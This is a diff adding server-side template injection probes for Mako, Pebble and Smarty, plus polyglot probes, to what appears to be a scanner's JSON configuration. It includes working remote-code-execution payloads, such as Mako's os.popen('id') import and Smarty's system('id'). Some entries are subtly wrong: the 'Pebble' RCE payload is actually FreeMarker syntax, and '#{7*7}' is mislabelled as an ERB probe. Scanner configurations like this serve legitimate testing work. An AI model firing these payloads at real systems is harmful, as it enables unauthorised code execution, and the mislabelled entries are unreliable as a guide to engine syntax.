@@ -125,6 +125,124 @@
           "variables": {}
         }
       ]
+    },
+    "mako": {
+      "description": "Server-Side Template Injection probes for Python Mako templates",
+      "tech_match": ["Python", "Pyramid", "TurboGears"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "Mako expression evaluation — 49 in response confirms Mako template execution",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "<%import os%>${os.popen('id').read()}",
+          "description": "Mako RCE via import tag and os.popen — uid= in response confirms arbitrary code execution",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "pebble": {
+      "description": "Server-Side Template Injection probes for Java Pebble templates",
+      "tech_match": ["Java", "Spring"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "{{ 7 * 7 }}",
+          "description": "Pebble arithmetic evaluation — 49 confirms Pebble template processing",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{'freemarker.template.utility.Execute'?new()('id')}}",
+          "description": "Pebble RCE attempt via class instantiation — uid= confirms code execution if engine allows it",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "smarty": {
+      "description": "Server-Side Template Injection probes for PHP Smarty templates",
+      "tech_match": ["PHP"],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "{$smarty.version}",
+          "description": "Smarty version variable — version number in response confirms Smarty template processing",
+          "matchers": [
+            {"type": "regex", "pattern": "[0-9]+\\.[0-9]+\\.[0-9]+"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{system('id')}",
+          "description": "Smarty system() function call — uid= in response confirms RCE via Smarty template injection",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "detection_polyglot": {
+      "description": "Universal SSTI detection polyglots — designed to provoke a response from multiple template engines simultaneously",
+      "tech_match": [],
+      "param_match": ["name", "template", "msg", "text", "title", "comment", "input", "value", "q"],
+      "probes": [
+        {
+          "payload": "${{<%[%'\"}}%\\",
+          "description": "Polyglot probe hitting Jinja2/Twig/EL/ERB delimiters — status 500 or error indicates template processing attempted",
+          "matchers": [
+            {"type": "status", "status": [500]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{7*7}}${7*7}<%=7*7%>${{7*7}}",
+          "description": "Multi-engine arithmetic polyglot — 49 anywhere in the response confirms at least one engine evaluated the expression",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "#{7*7}",
+          "description": "Ruby ERB / Velocity expression probe — 49 confirms ERB or Velocity template evaluation",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
     }
   }
 }
